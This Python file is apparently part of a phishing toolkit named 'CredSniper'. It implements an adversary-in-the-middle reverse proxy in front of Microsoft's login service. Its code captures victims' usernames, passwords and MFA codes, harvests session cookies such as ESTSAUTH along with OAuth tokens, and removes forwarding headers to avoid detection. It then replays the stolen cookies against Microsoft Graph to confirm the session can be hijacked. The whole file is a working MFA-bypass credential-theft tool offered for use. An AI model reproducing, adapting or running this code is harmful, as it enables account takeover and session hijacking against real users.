import asyncio
import json
import os
import time
import datetime
import tempfile
import threading
from mitmproxy import http, ctx, options
from mitmproxy.tools.dump import DumpMaster
from urllib.parse import urlparse, parse_qs, urlencode
import requests
from typing import Optional, List, Dict, Any
import logging
import sys


class AiTMProxy:
    """
    Adversary-in-the-Middle proxy for intercepting Microsoft login flows.
    Captures session cookies, authentication tokens, and other artifacts.
    """
    
    def __init__(self, target_domain: str = "login.microsoftonline.com", 
                 proxy_port: int = 8080, victim_email: str = None):
        self.target_domain = target_domain
        self.proxy_port = proxy_port
        self.victim_email = victim_email
        self.captured_data = {
            'cookies': [],
            'tokens': [],
            'credentials': {},
            'flow_artifacts': [],
            'session_info': {}
        }
        
        # HAR-like traffic capture
        self.traffic_log = []
        self.master = None
        self.is_running = False
        
        # Setup logging
        self.logger = logging.getLogger('aitm_proxy')
        self.logger.setLevel(logging.INFO)
        if not self.logger.handlers:
            handler = logging.StreamHandler(sys.stdout)
            formatter = logging.Formatter('[%(asctime)s] AITM: %(message)s')
            handler.setFormatter(formatter)
            self.logger.addHandler(handler)


    
    def log(self, message: str):
        """Unified logging method"""
        self.logger.info(message)
        
    def start_proxy(self) -> bool:

        """Start the mitmproxy server in a separate thread"""
        try:
            self.log(f"Starting AiTM proxy on port {self.proxy_port}")
            
            # Configure mitmproxy options
            opts = options.Options(
                listen_port=self.proxy_port,
                mode='reverse:https://' + self.target_domain,
                ssl_insecure=True,
                confdir=tempfile.mkdtemp(),
                flow_detail=3
            )
            
            # Create master and add our addon
            self.master = DumpMaster(opts)
            self.master.addons.add(self)
            
            # Start proxy in thread
            def run_proxy():
                try:
                    asyncio.run(self.master.run())
                except Exception as e:
                    self.log(f"Proxy thread error: {e}")
            
            proxy_thread = threading.Thread(target=run_proxy, daemon=True)
            proxy_thread.start()
            
            # Give proxy time to start
            time.sleep(2)
            self.is_running = True
            self.log(f"AiTM proxy started successfully on port {self.proxy_port}")
            return True
            
        except Exception as e:
            self.log(f"Failed to start proxy: {e}")

            return False
    
    def stop_proxy(self):
        """Stop the proxy server"""
        try:
            if self.master:
                self.master.shutdown()
            self.is_running = False
            self.log("AiTM proxy stopped")
        except Exception as e:
            self.log(f"Error stopping proxy: {e}")
    
    def request(self, flow: http.HTTPFlow) -> None:
        """Intercept and modify requests"""
        try:
            # Log the request
            req_data = {
                'timestamp': datetime.datetime.utcnow().isoformat(),
                'method': flow.request.method,
                'url': flow.request.pretty_url,
                'headers': dict(flow.request.headers),
                'body': flow.request.content.decode('utf-8', errors='ignore') if flow.request.content else ''
            }
            
            # Check for credentials in POST data
            if flow.request.method == 'POST' and flow.request.content:
                content = flow.request.content.decode('utf-8', errors='ignore')
                
                # Look for email/username
                if 'loginfmt=' in content or 'username=' in content:
                    self.log(f"[REQUEST] Captured potential username in POST data")
                    self._extract_credentials_from_post(content)
                
                # Look for password
                if 'passwd=' in content or 'password=' in content:
                    self.log(f"[REQUEST] Captured potential password in POST data")
                    self._extract_credentials_from_post(content)
                
                # Look for 2FA codes
                if 'otc=' in content or 'code=' in content:
                    self.log(f"[REQUEST] Captured potential 2FA code in POST data")
                    self._extract_credentials_from_post(content)
            
            self.traffic_log.append({'type': 'request', 'data': req_data})
            
            # Modify request headers to avoid detection
            flow.request.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            
            # Remove proxy-related headers that might give us away
            headers_to_remove = ['X-Forwarded-For', 'X-Real-IP', 'X-Forwarded-Proto']
            for header in headers_to_remove:
                if header in flow.request.headers:
                    del flow.request.headers[header]
                    
        except Exception as e:
            self.log(f"Error processing request: {e}")
    
    def response(self, flow: http.HTTPFlow) -> None:
        """Intercept and analyze responses"""
        try:
            # Log the response
            resp_data = {
                'timestamp': datetime.datetime.utcnow().isoformat(),
                'status_code': flow.response.status_code,
                'headers': dict(flow.response.headers),
                'body': flow.response.content.decode('utf-8', errors='ignore') if flow.response.content else ''
            }
            
            # Capture Set-Cookie headers (the crown jewels!)
            if 'Set-Cookie' in flow.response.headers:
                self._capture_cookies(flow.response.headers.get_all('Set-Cookie'))
            
            # Look for authentication tokens in response
            if flow.response.content:
                content = flow.response.content.decode('utf-8', errors='ignore')
                self._extract_tokens_from_response(content)
            
            # Check for authentication success indicators
            self._check_auth_success(flow, resp_data)
            
            self.traffic_log.append({'type': 'response', 'data': resp_data})
            
        except Exception as e:
            self.log(f"Error processing response: {e}")
    
    def _extract_credentials_from_post(self, content: str):
        """Extract credentials from POST request content"""
        try:
            # Parse form data
            params = parse_qs(content)
            
            # Common credential field names
            email_fields = ['loginfmt', 'username', 'email', 'login']
            password_fields = ['passwd', 'password', 'pwd']
            mfa_fields = ['otc', 'code', 'otp', 'two_factor_token']
            
            for field in email_fields:
                if field in params and params[field]:
                    email = params[field][0]
                    self.captured_data['credentials']['email'] = email
                    self.log(f"[CAPTURE] Email: {email}")
            
            for field in password_fields:
                if field in params and params[field]:
                    password = params[field][0]
                    self.captured_data['credentials']['password'] = password
                    self.log(f"[CAPTURE] Password: {'*' * len(password)}")
            
            for field in mfa_fields:
                if field in params and params[field]:
                    mfa_code = params[field][0]
                    self.captured_data['credentials']['mfa_code'] = mfa_code
                    self.log(f"[CAPTURE] MFA Code: {mfa_code}")
                    
        except Exception as e:
            self.log(f"Error extracting credentials: {e}")
    
    def _capture_cookies(self, set_cookie_headers: List[str]):
        """Capture and analyze Set-Cookie headers"""
        try:
            for cookie_header in set_cookie_headers:
                cookie_data = {
                    'timestamp': datetime.datetime.utcnow().isoformat(),
                    'raw_header': cookie_header,
                    'parsed': self._parse_cookie(cookie_header)
                }
                
                self.captured_data['cookies'].append(cookie_data)
                
                # Check for important Microsoft cookies
                important_cookies = [
                    'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT',
                    'SignInStateCookie', 'AADSID', 'AADB2C90007',
                    'buid', 'esctx', 'x-ms-gateway-slice',
                    'fpc', 'stsservicecookie'
                ]
                
                cookie_name = cookie_header.split('=')[0] if '=' in cookie_header else ''
                if any(name.lower() in cookie_name.lower() for name in important_cookies):
                    self.log(f"[CAPTURE] Important cookie: {cookie_name}")
                    
        except Exception as e:
            self.log(f"Error capturing cookies: {e}")
    
    def _parse_cookie(self, cookie_header: str) -> dict:
        """Parse a Set-Cookie header into components"""
        try:
            parts = cookie_header.split(';')
            if not parts:
                return {}
            
            # First part is name=value
            name_value = parts[0].strip()
            if '=' not in name_value:
                return {}
            
            name, value = name_value.split('=', 1)
            cookie = {'name': name.strip(), 'value': value.strip()}
            
            # Parse additional attributes
            for part in parts[1:]:
                part = part.strip()
                if '=' in part:
                    attr_name, attr_value = part.split('=', 1)
                    cookie[attr_name.lower()] = attr_value
                else:
                    cookie[part.lower()] = True
            
            return cookie
            
        except Exception as e:
            self.log(f"Error parsing cookie: {e}")
            return {}
    
    def _extract_tokens_from_response(self, content: str):
        """Extract authentication tokens from response content"""
        try:
            # Look for common token patterns
            token_patterns = [
                'access_token', 'id_token', 'refresh_token',
                'authorization_code', 'state', 'session_state'
            ]
            
            for pattern in token_patterns:
                if pattern in content.lower():
                    # Try to extract JSON-embedded tokens
                    try:
                        # Simple regex-like extraction for JSON values
                        start_idx = content.lower().find(f'"{pattern}"')
                        if start_idx != -1:
                            # Find the value after the colon
                            colon_idx = content.find(':', start_idx)
                            if colon_idx != -1:
                                # Extract until next quote or comma
                                value_start = content.find('"', colon_idx) + 1
                                value_end = content.find('"', value_start)
                                if value_start > 0 and value_end > value_start:
                                    token_value = content[value_start:value_end]
                                    self.captured_data['tokens'].append({
                                        'type': pattern,
                                        'value': token_value,
                                        'timestamp': datetime.datetime.utcnow().isoformat()
                                    })
                                    self.log(f"[CAPTURE] Token {pattern}: {token_value[:20]}...")
                    except:
                        pass
                        
        except Exception as e:
            self.log(f"Error extracting tokens: {e}")
    
    def _check_auth_success(self, flow: http.HTTPFlow, resp_data: dict):
        """Check if authentication was successful"""
        try:
            # Success indicators
            success_urls = [
                'office.com', 'outlook.com', 'portal.azure.com',
                'admin.microsoft.com', 'myaccount.microsoft.com'
            ]
            
            success_content = [
                'authentication successful', 'login successful',
                'welcome', 'dashboard', 'signed in'
            ]
            
            # Check URL for success redirect
            if any(url in flow.request.pretty_url.lower() for url in success_urls):
                self.captured_data['session_info']['auth_success'] = True
                self.captured_data['session_info']['success_url'] = flow.request.pretty_url
                self.captured_data['session_info']['timestamp'] = datetime.datetime.utcnow().isoformat()
                self.log(f"[SUCCESS] Authentication successful - redirected to {flow.request.pretty_url}")
            
            # Check response content
            content = resp_data.get('body', '').lower()
            if any(indicator in content for indicator in success_content):
                self.captured_data['session_info']['auth_success'] = True
                self.log(f"[SUCCESS] Authentication success detected in response content")
                
        except Exception as e:
            self.log(f"Error checking auth success: {e}")
    
    def get_captured_data(self) -> dict:
        """Return all captured data"""
        return self.captured_data.copy()
    
    def save_har_file(self, filepath: str) -> bool:
        """Save traffic log in HAR format"""
        try:
            har_data = {
                'log': {
                    'version': '1.2',
                    'creator': {'name': 'CredSniper AiTM', 'version': '1.0'},
                    'entries': []
                }
            }
            
            for entry in self.traffic_log:
                har_entry = {
                    'startedDateTime': entry['data']['timestamp'],
                    'request': entry['data'] if entry['type'] == 'request' else {},
                    'response': entry['data'] if entry['type'] == 'response' else {},
                    'cache': {},
                    'timings': {'total': 0}
                }
                har_data['log']['entries'].append(har_entry)
            
            with open(filepath, 'w') as f:
                json.dump(har_data, f, indent=2)
            
            self.log(f"HAR file saved: {filepath}")
            return True
            
        except Exception as e:
            self.log(f"Error saving HAR file: {e}")
            return False
    
    def validate_captured_cookies(self, test_url: str = "https://graph.microsoft.com/v1.0/me") -> dict:
        """Test if captured cookies are still valid"""
        try:
            if not self.captured_data['cookies']:
                return {'valid': False, 'error': 'No cookies captured'}
            
            # Build cookie string
            cookie_string = []
            for cookie_data in self.captured_data['cookies']:
                cookie = cookie_data['parsed']
                if 'name' in cookie and 'value' in cookie:
                    cookie_string.append(f"{cookie['name']}={cookie['value']}")
            
            if not cookie_string:
                return {'valid': False, 'error': 'No valid cookies to test'}
            
            headers = {
                'Cookie': '; '.join(cookie_string),
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            response = requests.get(test_url, headers=headers, timeout=10)
            
            result = {
                'valid': response.status_code == 200,
                'status_code': response.status_code,
                'response_size': len(response.content),
                'test_url': test_url,
                'timestamp': datetime.datetime.utcnow().isoformat()
            }
            
            if response.status_code == 200:
                self.log(f"[VALIDATION] Cookies are valid - successful request to {test_url}")
            else:
                self.log(f"[VALIDATION] Cookies may be invalid - status {response.status_code}")
            
            return result
            
        except Exception as e:
            self.log(f"Error validating cookies: {e}")
            return {'valid': False, 'error': str(e)}

class AiTMManager:
    """
    High-level manager for AiTM proxy operations.
    Integrates with existing CredSniper modules.
    """
    
    def __init__(self):
        self.proxy = None
        self.proxy_enabled = False
        
    def start_aitm_attack(self, victim_email: str, proxy_port: int = 8080) -> dict:
        """Start AiTM proxy and return proxy URL for victim"""
        try:
            self.proxy = AiTMProxy(
                target_domain="login.microsoftonline.com",
                proxy_port=proxy_port,
                victim_email=victim_email
            )
            
            if self.proxy.start_proxy():
                self.proxy_enabled = True
                
                # Generate phishing URL
                phishing_url = f"http://localhost:{proxy_port}"
                
                return {
                    'success': True,
                    'proxy_url': phishing_url,
                    'proxy_port': proxy_port,
                    'message': 'AiTM proxy started successfully'
                }
            else:
                return {
                    'success': False,
                    'error': 'Failed to start AiTM proxy'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'AiTM startup error: {str(e)}'
            }
    
    def get_attack_results(self) -> dict:
        """Get captured data from AiTM proxy"""
        if self.proxy:
            return self.proxy.get_captured_data()
        return {}
    
    def stop_aitm_attack(self) -> bool:
        """Stop the AiTM proxy"""
        try:
            if self.proxy:
                self.proxy.stop_proxy()
                self.proxy_enabled = False
                return True
            return False
        except Exception as e:
            print(f"Error stopping AiTM: {e}")
            return False
    
    def validate_session(self) -> dict:
        """Validate captured session cookies"""
        if self.proxy:
            return self.proxy.validate_captured_cookies()
        return {'valid': False, 'error': 'No active proxy'}